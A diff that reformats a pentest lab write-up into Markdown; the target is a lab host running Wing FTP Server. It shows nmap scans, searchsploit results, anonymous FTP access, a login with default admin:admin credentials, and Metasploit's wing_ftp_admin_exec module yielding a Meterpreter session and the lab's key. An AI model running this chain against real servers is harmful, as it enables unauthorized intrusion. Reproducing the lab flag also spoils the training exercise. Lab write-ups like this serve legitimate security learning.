@@ -1,17 +1,11 @@
-IP Address is 
-10.14.1.36
+# Pentest 2 - Steven - 36
 
-Suggestions indicate:
-Active Information Gathering
-Vulnerability & Exploit Databases (exploit-db and searchsploit)
-Intro Password Attacks
-Basic Commands
-Exploit commands
+IP Address is 10.14.1.36
 
-Lets Start with Scanning
+### Scanning  
 First we will capture our report to 2/initial
                                          
-
+```bash
 nmap -Pn -sC -sV -oN 2/initial $STEVEN
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-27 18:07 EDT
 Nmap scan report for 10.14.1.36
@@ -49,25 +43,23 @@ PORT   STATE SERVICE VERSION
 |_http-title: Site doesn't have a title (text/html).
 |_http-server-header: Wing FTP Server(Ferdi Bak)
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+```
 
-
-So we see FTP and 80 (http) open
-Additionally, we can see it's using "Wing FTP Server"
-Lets search and see if there is anything in searchsploit.
-Additionally since it's open on port 80, lets see if there is anything on the page?
+So we see FTP and 80 (http) open  
+Additionally, we can see it's using "Wing FTP Server"  
+Lets search and see if there is anything in searchsploit.  
+Additionally since it's open on port 80, lets see if there is anything on the page?  
 ![Image1](/VHL/Reports/2/2_1.png)
 
-
-
 Let's also see if we can determine what OS is being used:
-
-
+```bash
 sudo nmap -A -p 21,80 -Pn $STEVEN 
 OS details: Microsoft Windows Server 2008 or 2008 Beta 3, Microsoft Windows Server 2008 R2 or Windows 8.1, Microsoft Windows 7 Professional or Windows 8, Microsoft Windows Embedded Standard 7, Microsoft Windows 8.1 R1, Microsoft Windows Phone 7.5 or 8.0, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008
+```
+So at this point we are guessing this is a windows server.  
+Let's see what searchsploit and exploit-db have?  
 
-So at this point we are guessing this is a windows server.
-Let's see what searchsploit and exploit-db have?
-
+```searchsploit wing
 Wing FTP Server - (Authenticated) Command Execution (Metasploit)                                              | windows/remote/34517.rb
 Wing FTP Server - Authenticated CSRF (Delete Admin)                                                           | php/webapps/48200.txt
 Wing FTP Server 3.2.4 - Cross-Site Request Forgery                                                            | multiple/webapps/10821.txt
@@ -77,23 +69,28 @@ Wing FTP Server 6.2.5 - Privilege Escalation                                    
 Wing FTP Server 6.3.8 - Remote Code Execution (Authenticated)                                                 | lua/webapps/48676.txt
 Wing FTP Server Admin 4.4.5 - Cross-Site Request Forgery (Add User)                                           | php/webapps/36992.txt
 Wing FTP Server Admin 4.4.5 - Multiple Vulnerabilities                                                        | windows/webapps/36861.txt
+```
 
-Since we know anonymous ftp is allowed, maybe we can try that?
+Since we know anonymous ftp is allowed, maybe we can try that?  
 ![Image2](/VHL/Reports/2/2_2.png)
 
 So we know that we can get into the server using anonymous login (with no password). 
-Can we do anything with this? I can't tell what version it is using despite being in the page. 
-As an anonymous user, I don't have permissions to upload.
-Let's see if the exploits yield any success?
+Can we do anything with this?   
+I can't tell what version it is using despite being in the page.   
+As an anonymous user, I don't have permissions to upload.  
+Let's see if the exploits yield any success?  
 
-Metasploit shows 1 good option:
+Metasploit shows 1 good option:  
+```bash
+search wing
    11  exploit/windows/ftp/wing_ftp_admin_exec         2014-06-19       excellent  Yes    Wing FTP Server Authenticated Command Execution
+```
 
+This required admin credentials - I realized I didn't have admin credentials, and would not be able to utilize this exploit currently.  
+Reviewing the internet for "Wing FTP server" however, tells me port 5466 and 7466 are also commonly used ports.  
+Lets scan to see if these yield anything?  
 
-This required admin credentials - I realized I didn't have admin credentials, and would be able to utilize this exploit.
-Reviewing the internet for "Wing FTP server" however, tells me port 5466 and 7466 are also commonly used ports.
-Lets scan to see if these yield anything?
-
+```bash
 sudo nmap -sS -Pn -p 5466,7466 $STEVEN
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-27 18:43 EDT
 Nmap scan report for 10.14.1.36
@@ -104,8 +101,11 @@ PORT     STATE    SERVICE
 7466/tcp filtered unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 2.75 seconds
+```
 
 Indeed!  Let's see what is there.
+
+```bash
 sudo nmap -sV -Pn -p 5466,7466 $STEVEN
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-27 18:44 EDT
 Nmap scan report for 10.14.1.36
@@ -117,16 +117,17 @@ PORT     STATE    SERVICE VERSION
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port5466-TCP:V=7.92%I=7%D=7/27%Time=64C2F367%P=x86_64-pc-linux-gnu%r(Ge
 SF:nericLines,1E7,"HTTP/1\.0\x20200\x20HTTP\x20OK\r\nServer:\x20Wing\x20FT
+```
 
-It looks like we are getting a page response from one of these, so can we pull a page?
-10.14.1.36:7466 yields nothing , but 10.14.1.36:5466 gives us the admin page!
-
-Lets try admin:admin? Wow, I didn't expect that to work…
+It looks like we are getting a page response from one of these, so can we pull a page?  
+10.14.1.36:7466 yields nothing , but 10.14.1.36:5466 gives us the admin page!  
+Lets try admin:admin?   
+Wow, I didn't expect that to work…  
 ![Image3](/VHL/Reports/2/2_3.png)
 
-So right now, we have both a metasploit that can take an admin user/password, as well as FTP webpage administrator access.
-Lets try metasploit first to see where this gets us?
-
+So right now, we have both a metasploit that can take an admin user/password, as well as FTP webpage administrator access.  
+Lets try metasploit first to see where this gets us?  
+```bash
 msfconsole
 use windows/ftp/wing_ftp_admin_exec
 Show options -> 
@@ -187,12 +188,18 @@ System Language : en_US
 Domain          : WORKGROUP
 Logged On Users : 2
 Meterpreter     : x86/windows
+```
 
-From here, attempted to search for key.txt:
+### Searching for the key
+
+From here, attempted to search for key.txt:  
+```bash
 search -f *key.txt
 No files matching your search were found.
+```
 
 Ok, nothing returned, lets check the paths from the provided / listed for the course?
+```bash
 ls "C:\Documents and Settings\Administrator\Desktop"
 Listing: C:\Documents and Settings\Administrator\Desktop
 ========================================================
@@ -202,8 +209,9 @@ Mode              Size  Type  Last modified              Name
 100666/rw-rw-rw-  282   fil   2017-05-22 06:22:27 -0400  desktop.ini
 100666/rw-rw-rw-  20    fil   2017-05-22 06:23:21 -0400  key.txt.txt
 
-
-meterpreter > cat key.txt.txt
-t70m5jaco2zy9vhqlb6smeterpreter > 
+meterpreter > cat C:\Documents and Settings\Administrator\Desktop\key.txt.txt
+t70m5jaco2zy9vhqlb6s
+meterpreter > 
+```
 
 There we go!
